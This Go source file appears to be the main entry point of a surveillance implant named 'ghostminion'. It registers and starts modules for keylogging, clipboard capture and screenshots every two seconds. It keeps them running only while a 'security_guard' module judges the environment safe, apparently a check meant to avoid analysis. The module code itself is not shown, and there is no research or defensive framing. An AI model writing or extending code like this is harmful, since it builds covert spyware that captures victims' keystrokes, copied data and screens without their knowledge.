package main

import (
	"ghostminion/apps"
	"ghostminion/db"
	"log"
	"sync"
)

func main() {
	var wg sync.WaitGroup

	db.Init()

	appManager := apps.NewAppManager()
	addBuiltinApps(appManager)
	appManager.StartAll(&wg)
	app, err := appManager.GetApp("security_guard")
	if err != nil {
		log.Fatalf("failed to get security_guard app: %v", err)
	}
	securityGuard, ok := app.(*apps.SecurityGuardApp)
	if !ok {
		log.Fatalf("failed to cast security_guard app to SecurityGuardApp")
	}
	for securityGuard.IsSafeToRun() {

	}

	appManager.StopAll()
	wg.Wait()
}

func addBuiltinApps(am *apps.AppManager) {
	am.AddApp("clipboard", &apps.ClipboardApp{})
	am.AddApp("keylogger", &apps.KeyLoggerApp{})
	am.AddApp("screenshot", &apps.ScreenshotApp{Interval: 2000})
	am.AddApp("security_guard", &apps.SecurityGuardApp{})
}
